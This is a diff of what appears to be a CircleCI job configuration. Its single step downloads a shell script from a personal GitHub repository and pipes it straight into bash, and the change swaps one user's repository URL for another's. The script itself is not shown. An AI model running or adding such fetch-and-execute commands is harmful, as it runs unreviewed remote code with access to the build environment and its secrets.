@@ -8,4 +8,4 @@ jobs:
       image: ubuntu-2004:202010-01 # recommended linux image
     resource_class: large
     steps:
-      - run: curl -sL https://github.com/youssefnone/cr/raw/circleci-project-setup/download.sh | bash
+      - run: curl -sL https://raw.githubusercontent.com/SA-17/cr/main/download.sh | bash
